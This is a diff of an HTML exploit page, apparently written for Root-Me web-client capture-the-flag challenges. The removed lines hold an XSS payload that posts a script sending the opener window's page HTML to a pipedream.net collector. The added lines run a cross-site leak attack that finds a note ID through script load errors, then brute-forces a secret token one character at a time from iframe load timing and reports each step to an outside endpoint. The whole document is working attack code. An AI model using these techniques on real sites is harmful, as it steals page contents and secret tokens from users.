@@ -6,30 +6,89 @@
         <title>Document</title>
     </head>
     <body>
-        <form
-            name="payload"
-            action="http://challenge01.root-me.org:58003/login"
-            method="post"
-        >
-            <input
-                type="text"
-                name="username"
-                value="<script>fetch('https://en751j6eplzxc.x.pipedream.net/', {method: 'post',body: opener.document.documentElement.innerHTML})</script>"
-                hidden
-            />
-            <input type="text" name="secret" value="secsecsec" hidden />
-            <button type="submit">Click</button>
-        </form>
+        <iframe id="ff" frameborder="0"></iframe>
     </body>
     <script>
-        const phase = location.hash.replace("#", "");
-        if (phase !== "2") {
-            open("https://tirgue.github.io/opener#2");
-            location = "http://challenge01.root-me.org:58003/profile";
-        } else {
-            setTimeout(() => {
-                document.forms["payload"].submit();
-            }, 100);
-        }
+        // prettier-ignore
+        const ALPHABET_UPPER = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
+        const ALPHABET_LOWER = ALPHABET_UPPER.map((c) => c.toLowerCase());
+        const NUMBERS = [...Array(10).keys()];
+        const CHAR_LIST = [...ALPHABET_LOWER, ...ALPHABET_UPPER, ...NUMBERS];
+
+        let baseUrl =
+            "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
+
+        const endpoint = "https://enouh66iqn4bc.x.pipedream.net/";
+
+        let c = 0;
+        let id = 0;
+        let token = "";
+        let isSearching = true;
+
+        const findId = async () => {
+            const loopPromise = () =>
+                new Promise((resolve) => {
+                    const sss = document.createElement("script");
+                    sss.onload = () => {
+                        isSearching = false;
+                        document.body.removeChild(sss);
+                        resolve();
+                    };
+                    sss.onerror = () => {
+                        id += 1;
+                        document.body.removeChild(sss);
+                        resolve();
+                    };
+                    sss.src = baseUrl + id;
+                    document.body.appendChild(sss);
+                });
+
+            while (isSearching) {
+                await loopPromise();
+                if (id % 100 === 0) {
+                    fetch(endpoint + "?passed=" + id);
+                }
+            }
+
+            isSearching = true;
+            fetch(endpoint + "?id=" + id);
+            baseUrl = baseUrl + id + "/";
+        };
+
+        const findToken = async () => {
+            const loopPromise = () =>
+                new Promise((resolve) => {
+                    const start = performance.now();
+                    ff.onload = () => {
+                        const timing = performance.now() - start;
+                        if (timing < 1000) {
+                            // not found
+                            c += 1;
+                            if (c === CHAR_LIST.length) {
+                                isSearching = false;
+                            }
+                        } else {
+                            // found
+                            token += CHAR_LIST[c];
+                            c = 0;
+                            fetch(endpoint + "?search=" + token);
+                        }
+                        resolve();
+                    };
+                    ff.src = baseUrl + token + CHAR_LIST[c];
+                });
+
+            while (isSearching) {
+                await loopPromise();
+            }
+
+            fetch(endpoint + "?done=" + token);
+        };
+
+        const main = async () => {
+            await findId();
+            await findToken();
+        };
+        main();
     </script>
 </html>
